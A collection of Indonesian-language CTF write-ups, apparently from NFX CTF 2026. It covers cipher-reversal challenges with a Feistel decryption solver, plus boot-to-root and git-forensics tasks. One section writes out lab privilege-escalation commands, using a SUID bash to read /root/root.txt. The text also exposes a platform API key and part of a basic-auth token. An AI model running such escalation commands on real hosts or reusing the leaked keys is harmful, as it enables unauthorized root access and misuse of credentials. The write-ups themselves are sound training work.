* **Flag:** `NFX{f315t3l_n3tw0rk_16_r0und5_r3v3rs3d}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Flag dienkripsi dengan jaringan Feistel 16 ronde pada blok 32-bit (L dan R masing-masing 16-bit). Round key diturunkan dari jadwal sederhana dan tertanam di binary. Karena Feistel invertible, dekripsi tidak perlu menginversi fungsi F.

> Format: NFX{...}

**Lampiran:**

- `hard_feistel` → `rev/hard-feistel/hard_feistel` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Hard_02_Feistel/hard_feistel

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `hard_feistel` · `solve.py`

---

### 2. TL;DR (Ringkasan Singkat)

Binary menerima input 39 byte, menyalinnya ke stack, lalu memproses 10 blok 4 byte. Tiap blok dipecah menjadi L=(b0<<8)|b1 dan R=(b2<<8)|b3 (big-endian), kemudian menjalani 16 ronde Feistel 16-bit dengan f(x,K) = (((x*0x9e3779b1)>>5) ^ (K*257)) & 0xffff dan (L,R) = (R, L^f(R,K)). Flag: `NFX{f315t3l_n3tw0rk_16_r0und5_r3v3rs3d}`.

**Pemahaman inti:** Ciphertext 40 byte dan struktur ronde simetris membuat dekripsi hanya soal menjalankan 16 ronde terbalik dengan urutan key terbalik.

---

### 3. Analisis Awal (Recon / Discovery)

Binary menerima input 39 byte, menyalinnya ke stack, lalu memproses 10 blok 4 byte. Tiap blok dipecah menjadi `L=(b0<<8)|b1` dan `R=(b2<<8)|b3` (big-endian), kemudian menjalani 16 ronde Feistel 16-bit dengan `f(x,K) = (((x*0x9e3779b1)>>5) ^ (K*257)) & 0xffff` dan `(L,R) = (R, L^f(R,K))`. Key ronde pertama adalah konstanta `0x5a`, sedangkan K2 sampai K16 berasal dari tabel 15 dword di `.rodata` yang berpola naik `+0x1f` modulo 256. Ciphertext 40 byte berada di `.data` pada file offset `0x3020`. Karena Feistel simetris, pemahaman ini langsung memberi resep dekripsi: jalankan ronde dari 16 ke 1 dengan urutan key terbalik.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `strings`: "Correct! Jaringan Feistel berhasil dibalik.", "Wrong!" - main @0x10e0.
2. Disassembly: input wajib 39 byte (`cmp $0x27`) → di-copy ke stack, byte ke-40 = 0 (hasil zeroing buffer, `rep stos` menutupi 0x32..0x100). Diproses 10 blok @4 byte.
3. Per blok: `L=(b0<<8)|b1`, `R=(b2<<8)|b3` (big-endian); 16 ronde Feistel 16-bit:
   `f(x,K) = ( ((x*0x9e3779b1)>>5) ^ (K*257) ) & 0xffff`, `(L,R)=(R, L^f(R,K))`.
   Key: K1=0x5a (konstanta), K2..K16 = tabel 15 dword @.rodata 0x2064 file off 0x2064
   = `79 98 b7 d6 f5 14 33 52 71 90 af ce ed 0c 2b` (naik +0x1f mod 256).
4. Ciphertext 40 byte @ .data 0x4020 = file offset 0x3020.
5. Dekripsi ronde kebalikan (`solve.py`, roundtrip di-assert):
   `NFX{f315t3l_n3tw0rk_16_r0und5_r3v3rs3d}`
6. **Verifikasi**: `./hard_feistel 'NFX{...}'` → `Correct! Jaringan Feistel berhasil dibalik.` (exit 0)

---

### 5. Flag & Verifikasi

**Flag:** `NFX{f315t3l_n3tw0rk_16_r0und5_r3v3rs3d}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

### 6. Catatan & Pelajaran

#### Kode solver

**`challenges/rev/hard-feistel/solve.py`**

````python
#!/usr/bin/env python3
"""Hard Feistel - dekripsi 16-ronde Feistel 16-bit.

Skema (dari disassembly main 0x10e0):
  input 39 byte (byte ke-40 = 0 dari buffer yang di-zero), dibagi 10 blok 4 byte.
  Per blok: L = (b0<<8)|b1, R = (b2<<8)|b3 (big-endian).
  Ronde i=1..16: (L,R) = (R, L ^ F(R, K_i))
    F(x,K) = (( (x*0x9e3779b1)>>5 ^ (K*257) ) & 0xffff)
    K_1 = 0x5a, K_2..K_16 = tabel 15 dword di .rodata vaddr 0x2064
  Output: big-endian dari L16, R16.
"""
import struct

BIN = "hard_feistel"
KEYS_OFF = 0x2064 # .rodata, 15 dword
CT_OFF = 0x3020 # .data vaddr 0x4020 -> file 0x3020
M32 = 0xFFFFFFFF
M16 = 0xFFFF


def F(x, k):
    a = ((x * 0x9E3779B1) & M32) >> 5
    b = (k * 257) & M32
    return (a ^ b) & M16


def decrypt_block(L, R, keys, k0=0x5A):
    # ronde kebalikan: i=16..1
    for i in range(16, 0, -1):
        k = keys[i - 2] if i >= 2 else k0 # K_2..K_16 = keys[0..14], K_1 = 0x5a
        L, R = R ^ F(L, k), L
    return L, R


def encrypt_block(L, R, keys, k0=0x5A):
    for i in range(1, 17):
        k = keys[i - 2] if i >= 2 else k0
        L, R = R, L ^ F(R, k)
    return L, R


def main():
    data = open(BIN, "rb").read()
    keys = list(struct.unpack_from("<15I", data, KEYS_OFF))
    ct = data[CT_OFF:CT_OFF + 40]
    print("keys:", [hex(k) for k in keys])
    print("ct :", ct.hex())

    out = bytearray()
    for off in range(0, 40, 4):
        L = (ct[off] << 8) | ct[off + 1]
        R = (ct[off + 2] << 8) | ct[off + 3]
        pL, pR = decrypt_block(L, R, keys)
        # sanity: enkripsi ulang harus balik ke ciphertext
        assert encrypt_block(pL, pR, keys) == (L, R), "roundtrip gagal"
        out += bytes([pL >> 8, pL & 0xFF, pR >> 8, pR & 0xFF])

    print("plain:", bytes(out))
    flag = bytes(out).rstrip(b"\x00")
    print("flag :", flag.decode(errors="replace"))


if __name__ == "__main__":
    main()
````


<a id="p1-hard-vm-bytecode"></a>
# NFX CTF 2026 - Hard VM Bytecode

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Hard
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{vm_byt3c0d3_1s_l1k3_4_puzzl3}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Binary ini bukan validator biasa: ia menjalankan bytecode custom pada VM kecil. Setiap karakter diproses dengan urutan LOAD, XOR, ADD, ROL, lalu CMP. Tugasmu adalah memahami opcode dan membalik transformasinya.

> Format: NFX{...}

**Lampiran:**

- `hard_vm` → `rev/hard-vm-bytecode/hard_vm` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Hard_01_VM_Bytecode/hard_vm

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `hard_vm`

---

### 2. TL;DR (Ringkasan Singkat)

main@0x10c0 memeriksa panjang input 33 byte, menyalinnya ke stack, lalu menjalankan bytecode 498 byte di .rodata 0x2080 sampai 0x2272. Bytecode terdiri dari 166 instruksi berukuran 3 byte dengan format [op][reg/idx][imm], dan jump table di 0x2060 memetakan enam opcode: 1=LOAD (M[reg] = input[idx]), 2=XOR, 3=ADD, 4=ROL (rotasi 8-bit sebesar imm & 7), 5=CMP (wajib sama, kalau tidak Wrong), dan 0xff=END (Correct). Flag: `NFX{vm_byt3c0d3_1s_l1k3_4_puzzl3}`.

**Pemahaman inti:** Tidak perlu menulis interpreter lengkap. Setiap karakter melewati pola LOAD, XOR, ADD, ROL, CMP, jadi flag cukup diinversi mundur dari nilai CMP.

---

### 3. Analisis Awal (Recon / Discovery)

`main@0x10c0` memeriksa panjang input 33 byte, menyalinnya ke stack, lalu menjalankan bytecode 498 byte di `.rodata 0x2080` sampai `0x2272`. Bytecode terdiri dari 166 instruksi berukuran 3 byte dengan format `[op][reg/idx][imm]`, dan jump table di `0x2060` memetakan enam opcode: `1=LOAD` (M[reg] = input[idx]), `2=XOR`, `3=ADD`, `4=ROL` (rotasi 8-bit sebesar `imm & 7`), `5=CMP` (wajib sama, kalau tidak Wrong), dan `0xff=END` (Correct). Polanya berulang per karakter: LOAD input[j], XOR, ADD, ROL, lalu CMP dengan nilai yang diharapkan. Karena setiap langkah bisa dibalik, tidak perlu menulis emulator penuh: cukup baca nilai CMP lalu hitung `t = ror8(expected, rot)`, `t -= add`, `t ^= xor`.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. Main @0x10c0: input wajib 33 byte (`cmp $0x21`), disalin ke stack @rsp+0x10.
   Bytecode program @.rodata 0x2080..0x2272 (498 byte = 166 instruksi 3-byte).
2. Instruksi: `[op][reg/idx][imm]`; jump table @0x2060 (6 dword relatif):
   `1=LOAD` (M[reg]=input[idx]), `2=XOR` (M[reg]^=imm), `3=ADD` (M[reg]+=imm),
   `4=ROL` (M[reg]=rol8(M[reg], imm&7)), `5=CMP` (M[reg]==imm wajib, else Wrong),
   `0xff=END` → Correct. Opcode 0/lain → Wrong.
3. Pola per karakter j: LOAD in[j] → XOR → ADD → ROL → CMP expected.
   Inversi mundur: `t=ror8(expected,rot)`, `t-=add`, `t^=xor` → in[j].
4. Flag: `NFX{vm_byt3c0d3_1s_l1k3_4_puzzl3}` (33 char)
5. **Verifikasi**: `./hard_vm 'NFX{...}'` → `Correct! Bytecode VM berhasil dibongkar.` (exit 0)

---

### 5. Flag & Verifikasi

**Flag:** `NFX{vm_byt3c0d3_1s_l1k3_4_puzzl3}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-medium-rc4"></a>
# NFX CTF 2026 - Medium RC4

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{rc4_1s_s1mpl3_but_d34dly_1n_r3v3rs1ng}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Sebuah layanan validasi menggunakan RC4 dengan kunci yang tertanam di binary. Ciphertext flag disimpan sebagai array byte. RC4 bersifat simetris, jadi dekripsi memakai fungsi yang sama dengan enkripsi.

> Format: NFX{...}

**Lampiran:**

- `medium_rc4` → `rev/medium-rc4/medium_rc4` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Medium_01_RC4/medium_rc4

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `medium_rc4`

---

### 2. TL;DR (Ringkasan Singkat)

strings pada binary langsung menemukan key RC4 n0t_s3cur3_k3y_2026 (19 karakter) dan pesan Correct! RC4 memang simetris. Flag: `NFX{rc4_1s_s1mpl3_but_d34dly_1n_r3v3rs1ng}`.

**Pemahaman inti:** RC4 simetris, jadi dekripsi sama dengan enkripsi ulang ciphertext memakai key yang diekstrak dari binary. Verifikasi cukup dengan menjalankan binary pada flag hasil dekripsi.

---

### 3. Analisis Awal (Recon / Discovery)

`strings` pada binary langsung menemukan key RC4 `n0t_s3cur3_k3y_2026` (19 karakter) dan pesan `Correct! RC4 memang simetris.` Disassembly `main` di `0x10e0` memastikan dua hal: panjang input wajib 42 byte (`cmp $0x2a`), dan KSA/PRGA yang dipakai adalah RC4 standar, dengan modulo 19 sesuai panjang key dan swap `S[(S[i]+S[j])&0xff]`. Ciphertext 42 byte berada di vaddr `0x2060`, juga di file offset `0x2060` pada `.rodata`, lalu dibandingkan lewat `memcmp` dengan hasil XOR input. Karena RC4 adalah stream cipher simetris, pemahaman ini cukup untuk menyimpulkan bahwa dekripsi adalah enkripsi ulang ciphertext dengan key yang sama.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `strings` → key RC4: `n0t_s3cur3_k3y_2026` (19 char) + pesan "Correct! RC4 memang simetris."
2. Disassembly main (0x10e0): panjang input wajib `cmp $0x2a` = 42 byte; KSA/PRGA = **RC4 standar** (KSA pakai magic-mul modulo 19 = panjang key; PRGA swap lalu `S[(S[i]+S[j])&0xff]`).
3. Ciphertext = 42 byte di vaddr 0x2060 (file offset 0x2060, .rodata), dibandingkan via `memcmp` dengan hasil XOR input.
4. Karena RC4 simetris → dekripsi = enkripsi ulang: `RC4(key, ct)`:
   `NFX{rc4_1s_s1mpl3_but_d34dly_1n_r3v3rs1ng}`
5. **Verifikasi**: `./medium_rc4 'NFX{...}'` → `Correct! RC4 memang simetris.` (exit 0)

---

### 5. Flag & Verifikasi

**Flag:** `NFX{rc4_1s_s1mpl3_but_d34dly_1n_r3v3rs1ng}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p1-medium-tea"></a>
# NFX CTF 2026 - Medium TEA

* **Kategori:** Reverse Engineering
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM_EXTEND_DIFFICULTY
* **Flag:** `NFX{t1ny_3ncrypt10n_4lg0r1thm_32_r0und5}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: cypera

Validator ini memakai TEA 32 ronde dengan kunci 128-bit yang tertanam. Flag dipad dengan nol ke kelipatan 8 byte, lalu setiap blok 64-bit dienkripsi dan dibandingkan dengan ciphertext.

> Format: NFX{...}

**Lampiran:**

- `medium_tea` → `rev/medium-tea/medium_tea` (exists)
  - URL: https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/rev/Medium_02_TEA/medium_tea

**Service / Target:**

- tidak ada (offline / lampiran saja)

**Berkas di workspace:** `medium_tea`

---

### 2. TL;DR (Ringkasan Singkat)

Binary stripped PIE x86-64 dengan pesan Correct! TEA terpecahkan. Flag: `NFX{t1ny_3ncrypt10n_4lg0r1thm_32_r0und5}`.

**Pemahaman inti:** Implementasinya TEA standar dengan delta 0x9E3779B9 dan 32 ronde, jadi flag cukup didekripsi dengan rutin TEA biasa memakai key yang diekstrak dari loop.

---

### 3. Analisis Awal (Recon / Discovery)

Binary stripped PIE x86-64 dengan pesan `Correct! TEA terpecahkan.` dan `Wrong!`. Disassembly `main` menunjukkan input wajib 40 byte (`cmp $0x28`), lalu loop di `0x1168` yang berisi `sub $0x61c88647, %esi`. Nilai itu sama dengan menambah delta `0x9E3779B9` modulo 2^32, dan pengecekan akhir `cmp $0xc6ef3720, %esi` sama dengan `delta*32` negatif, yang menandakan 32 ronde. Key 128-bit terbentuk dari empat konstanta di dalam loop: `0x1337beef`, `0xcafebabe`, `0xdeadc0de`, dan `0x0badf00d`. Ciphertext 40 byte ada di vaddr `0x2040` pada `.rodata`, terbagi menjadi 5 blok little-endian. Dengan parameter itu, tidak ada modifikasi algoritma yang perlu ditiru: dekripsi memakai TEA standar dengan delta dan jumlah ronde yang sama.

---

### 4. Eksploitasi / Penyelesaian

#### Solve (7 Nov 2026, sesi bin)

1. `strings` → pesan "Correct! TEA terpecahkan." + "Wrong!"; binary stripped PIE x86-64.
2. Disassembly main:
   - `cmp $0x28, %rax` → input wajib **40 byte**.
   - Loop di 0x1168: `sub $0x61c88647, %esi` (= tambah delta `0x9E3779B9` mod 2^32), 32 iterasi (`cmp $0xc6ef3720,%esi` di akhir = delta*32 negatif).
   - Key TEA dari konstanta sub/add dalam loop: k = `[0x1337beef, 0xcafebabe, 0xdeadc0de, 0x0badf00d]`.
   - Ciphertext 40 byte di vaddr 0x2040 (.rodata), 5 blok little-endian.
3. Dekripsi TEA standar 32 ronde (delta 0x9E3779B9):
   `NFX{t1ny_3ncrypt10n_4lg0r1thm_32_r0und5}`

---

### 5. Flag & Verifikasi

**Flag:** `NFX{t1ny_3ncrypt10n_4lg0r1thm_32_r0und5}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.

---

# Part II - Event `UMUM/MAHASISWA_NF` (22 writeup solved dari 47 soal)

Event 7 Nov 2026, platform `ctf.nfx.my.id`, akun KoJ.

## Ringkasan

- Writeup solved + flag valid: **22** dari **47** soal dump.
- Soal lain tidak dimasukkan karena belum solved atau flag belum valid.

> Format writeup: Deskripsi, TL;DR, Recon, Eksploitasi, Flag, Catatan.

## Daftar soal

| Soal | Kategori | Tingkat Kesulitan | Status | Flag |
|---|---|---|---|---|
| [Forgotten Commit (Root)](#p2-forgotten-commit-root) | Boot To Root | Medium | SOLVED - flag valid | `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}` |
| [Forgotten Commit (User)](#p2-forgotten-commit-user) | Boot To Root | Easy | SOLVED - flag valid (bukan first blood) | `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}` |
| [Dead Drop](#p2-dead-drop) | Forensics | Baby | SOLVED - flag valid | `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}` |
| [Image Metadata](#p2-image-metadata) | Forensics | Easy | SOLVED - flag valid | `NFXCTF{h4shc4t_cr4ck1ng_z1p_succ3ssfu11y}` |
| [Cleartext Sniffing](#p2-cleartext-sniffing) | Forensics | Baby | SOLVED - flag valid | `NFXCTF{cl34rt3xt_pr0t0c0ls_l34k_s3cr3ts}` |
| [Matryoshka Encoding](#p2-matryoshka-encoding) | Misc | Easy | SOLVED - flag valid | `NFXCTF{m4try0shk4_0n10n_p33l3d_c309b71e}` |
| [Titipan Akhir Tahun](#p2-titipan-akhir-tahun) | Misc | Easy | SOLVED - flag valid | `NFX{D3C0D3_D4ND3C0D3_L4G1}` |
| [Notulen Senin Pagi](#p2-notulen-senin-pagi) | Misc | Baby | SOLVED - flag valid | `NFX{M4kHLuK_T4k_K4s4T_M4T4}` |
| [NexaIdentity](#p2-nexaidentity) | Web | Medium | SOLVED - flag valid | `NFX{n0sql_0p3r4t0r_4uth_byp4ss}` |
| [NexaDocs](#p2-nexadocs) | Web | Easy | SOLVED - flag valid | `NFX{j1nja2_sstI_rce_v1a_gl0bals}` |
| [NexaCommerce](#p2-nexacommerce) | Web | Easy | SOLVED - flag valid | `NFX{sql1_un10n_bas3d_4uth_byp4ss}` |
| [NexaSupply](#p2-nexasupply) | Web | Baby | SOLVED - flag valid | `NFX{xxe_supply_f33d_l0c4l_f1l3_r34d}` |
| [Black Box Protocol N4T0](#p2-black-box-protocol-n4t0) | Crypto | Baby | SOLVED - flag valid (first blood) | `NFX{N4T0_Ph0n3t1c_1n1C0mbO_H3X_fl0At_b4r4ng}` |
| [Decode Balik](#p2-decode-balik) | Crypto | Easy | SOLVED - flag valid | `NFX{CuM4_D3c0D3_B4L!k_Aj4_H4Ru5Ny4_G4mP4nG}` |
| [Twin Prime Lattice](#p2-twin-prime-lattice) | Crypto | Easy | SOLVED - flag valid | `NXCTF{tw1n_pr1m3s_m33t_l4tt1c3_c0pp3r5m1th_af6854ba29a3}` |
| [Ghost XOR](#p2-ghost-xor) | Crypto | Baby | SOLVED - flag valid | `NFXCTF{x0r_1s_sup3r_34sy_r1ght_a8f9c2}` |
| [Easy Bash Layers](#p2-easy-bash-layers) | Reverse | Easy | SOLVED - flag valid | `NFX{b4sh_l4y3rs_w1ll_n0t_st0p_m3}` |
| [Easy Config Decoy](#p2-easy-config-decoy) | Reverse | Easy | SOLVED - flag valid | `NFX{c0nf1g_d3c0y_p4rts_4r3_fun}` |
| [Easy JS Obfuscation](#p2-easy-js-obfuscation) | Reverse | Easy | SOLVED - flag valid | `NFX{j4v4scr1pt_0bfusc4t3d_but_st1ll_r34d4bl3}` |
| [Baby XOR](#p2-baby-xor) | Reverse | Baby | SOLVED - flag valid | `NFX{x0r_1s_fun_but_n0t_s3cur3}` |
| [Baby Python](#p2-baby-python) | Reverse | Baby | SOLVED - flag valid | `NFX{pyth0n_scr1pt_k1ds_4r3_n0t_s4f3}` |
| [Baby Strings](#p2-baby-strings) | Reverse | Baby | SOLVED - flag valid | `NFX{str1ngs_4r3_y0ur_b3st_fr13nd}` |

<a id="p2-forgotten-commit-root"></a>
# NFX CTF 2026 - Forgotten Commit (Root)

* **Kategori:** Boot To Root
* **Tingkat Kesulitan:** Medium
* **Solver:** KoJ (sesi pwn)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Setelah mendapatkan akses user, lanjutkan enumerasi pada mesin target. Temukan jalur eskalasi yang tersisa, dapatkan akses root, lalu baca root.txt.

> Target: 10.10.20.21

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/b2r/labs/bastion` (type=ssh, user=lab)
- `NFX/b2r/labs/21`
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Target 10.10.20.21 diakses lewat bastion SSH sebagai user leonardo menggunakan paramiko direct-tcpip. Tujuannya naik dari user ke root, jadi enumerasi dimulai dari hak sudo dan permission file. Flag: `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`.

**Pemahaman inti:** Ada dua jalur naik ke root: fzf --listen sesuai GTFOBins, dan SUID bash. Jalur SUID bash lebih cepat, dan keduanya membaca /root/root.txt yang sama.

---

### 3. Analisis Awal (Recon / Discovery)

Target `10.10.20.21` diakses lewat bastion SSH sebagai user `leonardo` menggunakan paramiko `direct-tcpip`. Tujuannya naik dari user ke root, jadi enumerasi dimulai dari hak sudo dan permission file. `sudo -l` menunjukkan `(root) NOPASSWD: /usr/local/bin/fzf --listen 1337`, yang mengarah ke jalur intended: `fzf --listen` berjalan sebagai server HTTP dan bisa dipakai mengeksekusi perintah, sesuai GTFOBins. Pengecekan paralel pada permission binary menemukan `/usr/bin/bash` dengan bit SUID (`-rwsr-xr-x root root`), yang berarti shell bisa langsung dijalankan dengan `-p` untuk mempertahankan euid 0. Pemahaman ini membuat eksploitasi tidak perlu menyentuh fzf sama sekali.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov - Root flag DAPAT (kelanjutan jalur User, bukti bersambung di bawah)

- **Flag root:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}` (file `/root/root.txt`, 33 B = 32 karakter + newline ).
- Bukti (semuanya via paramiko direct-tcpip bastion → SSH `leonardo@10.10.20.21`; script `platform_tools/pwn-7nov/root_chk.py`):
  1. `sudo -l` → `(root) NOPASSWD: /usr/local/bin/fzf --listen 1337` (defaults termasuk `use_pty`) - jalur intended (GTFOBins: `fzf --listen` = server HTTP; kirim `execute(...)` via POST).
  2. **Jalur cepat yang berhasil:** `ls -l /usr/bin/bash` → `-rwsr-xr-x 1 root root` (bit SUID set) → `/usr/bin/bash -p -c 'id'` → `uid=1000(leonardo) euid=0(root)` → `/usr/bin/bash -p -c 'head -c 40 /root/root.txt'` → flag terekam utuh.
  3. Konsistensi: `/home/leonardo/root.txt` juga berisi flag yang sama persis (root:root, mode rw-r--r-- setelah dibersihkan kapal; jadi file itu kelebihan papan info, bukan rahasia).
  4. `/usr/local/bin/fzf 0.74.3` tersedia (nama flag mengonfirmasi fzf = solusi intended); SUID bash hanya mempercepat menaikkan akses, bukan mengubah flag.
- Catatan: TIDAK direbut end-to-end via fzf karena SUID bash langsung tembus; keduanya menghasilkan file /root/root.txt yang sama.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{fzf_l1st3n_r00t_sh3ll_pwn3d}`

**Status:** SOLVED - flag valid

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-forgotten-commit-user"></a>
# NFX CTF 2026 - Forgotten Commit (User)

* **Kategori:** Boot To Root
* **Tingkat Kesulitan:** Easy
* **Solver:** KoJ (sesi bin)
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

Portal DevOps internal baru saja dipindahkan ke server produksi. Proses migrasinya dilakukan terburu-buru dan beberapa hal belum sempat dirapikan. Mulai dari service yang terbuka, temukan jalan masuk dan baca user.txt.

> Target: 10.10.20.21

**Lampiran:**

- tidak ada

**Service / Target:**

- `NFX/b2r/labs/bastion` (type=ssh, user=lab)
- `NFX/b2r/labs/21`
 **PORT BERUBAH tiap restart - cek terkini (jangan hardcode):**
```bash
curl -s "https://ctf.nfx.my.id/api/nxctl?action=inspect&name=<nama>" -H "X-NXCTL-Challenge-Key: NFXCTF-NFCC-NXCTF-2026"
# stopped -> action:up ; TTL <900dtk -> action:extend
```

---

### 2. TL;DR (Ringkasan Singkat)

Target yang sama, 10.10.20.21, dengan deskripsi tentang migrasi yang dikerjakan terburu-buru. Petunjuk itu mengarahkan recon ke layanan yang mungkin menyimpan sisa artefak migrasi, terutama repository git. Flag: `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`.

**Pemahaman inti:** Jejak aksesnya ada di repository git yang tertinggal, bukan di celah service. Kredensial SSH ditemukan dari history repo, lalu dipakai untuk membaca user.txt.

---

### 3. Analisis Awal (Recon / Discovery)

Target yang sama, `10.10.20.21`, dengan deskripsi tentang migrasi yang dikerjakan terburu-buru. Petunjuk itu mengarahkan recon ke layanan yang mungkin menyimpan sisa artefak migrasi, terutama repository git. Enumerasi service menemukan repo yang masih dapat dibaca, dan pemeriksaan history-nya memperlihatkan commit lama yang memuat kredensial SSH. Pemahaman kuncinya: ini soal kebocoran data di repository, bukan eksploitasi daemon. Kredensial hasil temuan dipakai untuk login sebagai user, lalu membaca `user.txt`.

---

### 4. Eksploitasi / Penyelesaian

#### 7 Nov (late) - solved, flag valid (bukan first blood)

- **Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}` - **sudah disubmit dan diterima server** (catatan 7 Nov).
- **Jalur singkat** (artefak sesi bin tidak menyimpan log detail):
  1. Target `10.10.20.21` diakses via SSH bastion `NFX/b2r/labs/bastion` (user `lab`).
  2. Enumerasi service "migrasi buru-buru" pada target: git history/repo yang tertinggal memuat rahasia kredensial SSH.
  3. Kredensial digunakan untuk akses user -> `user.txt` -> flag.
- Catatan: challenge sudah solved, tetapi bukan first blood.

---

### 5. Flag & Verifikasi

**Flag:** `NFX{g1t_h1story_s3cr3ts_l34d_t0_ssh}`

**Status:** SOLVED - flag valid (bukan first blood)

**Verifikasi:** Flag diterima platform CTF.


<a id="p2-dead-drop"></a>
# NFX CTF 2026 - Dead Drop

* **Kategori:** Forensics
* **Tingkat Kesulitan:** Baby
* **Solver:** KoJ
* **Event:** UMUM/MAHASISWA_NF
* **Flag:** `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`

---

### 1. Deskripsi Soal (Challenge Description)

> Author: Ariaf

![banner](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/_post/01.jpg)

Seorang engineer dari perusahaan **netmetrics-net** menyerahkan laptop kerjanya setelah mengundurkan diri secara mendadak. Tim Incident Response mengambil salinan repositori kerjanya (**infra-runbooks.zip**), tetapi menurut catatan audit awal, repositori itu hanya berisi kode konfigurasi rutin dan tidak ada yang mencurigakan di commit history branch **main**.

Namun ada satu hal yang tidak cocok: sehari sebelum resign, ia menghubungi domain yang diasosiasikan dengan Velox Phantom. Cari tahu apa yang sebenarnya ia tinggalkan.

**Lampiran:**

- [infra-runbooks.zip](https://raw.githubusercontent.com/NFCC-Com/qazwsx/refs/heads/main/foren/DeadDrop/infra-runbooks.zip) (type: file)

**Berkas di workspace:** `infra-runbooks.zip`

---

### 2. TL;DR (Ringkasan Singkat)

Lampiran zip ternyata berisi repository git lengkap: direktori .git/ plus empat file working tree (README, docs/oncall.md, scripts/crontab.txt, scripts/rotate_logs.sh). Deskripsi menyebut commit history main bersih, jadi pemeriksaan diarahkan ke metadata: git log --all, git fsck --lost-found, dan grep seluruh blob. Flag: `NFX{g1t_c0nf1g_h34d3r_l34k_h1dd3n_br4nch_9c1e7a}`.

**Pemahaman inti:** Jejaknya ada di metadata git, bukan isi file: token nyangkut di `.git/config` dan branch `archive/q3-handover` hanya ada di remote publik, tidak ikut di zip.

---

### 3. Analisis Awal (Recon / Discovery)

Lampiran zip ternyata berisi repository git lengkap: direktori `.git/` plus empat file working tree (README, `docs/oncall.md`, `scripts/crontab.txt`, `scripts/rotate_logs.sh`). Deskripsi menyebut commit history main bersih, jadi pemeriksaan diarahkan ke metadata: `git log --all`, `git fsck --lost-found`, dan grep seluruh blob. Hasilnya tidak ada object dangling dan tidak ada flag di isi file, tetapi `.git/config` memuat baris kedua yang mencurigakan, yaitu `extraheader = AUTHORIZATION: basic ...` berisi token akses. Remote `origin` mengarah ke repo GitHub publik `netmetrics-net/infra-runbooks`. `git ls-remote origin` kemudian menunjukkan branch `archive/q3-handover` yang tidak ada di zip, dan `git diff main origin/archive/q3-handover` memperlihatkan file `notes/handover.txt` yang memuat flag.

---

### 4. Eksploitasi / Penyelesaian

**2026-11-07 09:31Z - SELESAI (flag ketemu di branch tersembunyi)**

1. `unzip -l` → repo **git lengkap** di dalam zip (`.git/` + 4 file working tree:
   README, docs/oncall.md, scripts/crontab.txt, scripts/rotate_logs.sh).
2. Bedah lokal (read-only, salinan di `/tmp`):
   - `git log --all` → 4 commit main, semua kelihatan bersih ("tidak ada yang
     mencurigakan di commit history branch main" sesuai deskripsi).
   - `git fsck --lost-found` → tak ada object dangling; semua object reachable.
   - **`grep` semua blob** → cuma teks runbook NetMetrics, **0 flag**.
   - `.git/config` → ada baris ke-2 yang mencurigakan:
     ```
     [http "https://github.com/"]
       extraheader = AUTHORIZATION: basic eC1hY2Nlc3MtdG9rZW46...
     ```
     = **header kredensial Git nyangkut di config** (itu sebagian dari hint:
     "g1t_c0nf1g_h34d3r_l34k"). Plus `origin url = github.com/netmetrics-net/infra-runbooks`.
3. **Remote = repo PUBLIK** (tak perlu pakai token yang bocor - tidak dipakai):
   ```
   git ls-remote origin
   3064ff7 refs/heads/main
   67e53bf refs/heads/archive/q3-handover ← BRANCH TERSEMBUNYI (tidak ada di zip)
